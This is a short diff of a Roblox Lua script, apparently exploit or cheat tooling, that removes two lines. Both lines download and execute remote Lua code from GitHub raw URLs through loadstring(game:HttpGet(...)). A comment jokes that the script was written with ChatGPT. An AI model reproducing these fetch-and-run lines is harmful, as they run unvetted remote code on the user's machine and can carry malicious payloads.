@@ -1,5 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/evilionx3/new-scripts/refs/heads/main/partclaim.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/evilionx3/discord/refs/heads/main/r"))()
+
 -- not obfuscated because i used chatgpt lmao
 
 local input = game:GetService("UserInputService")
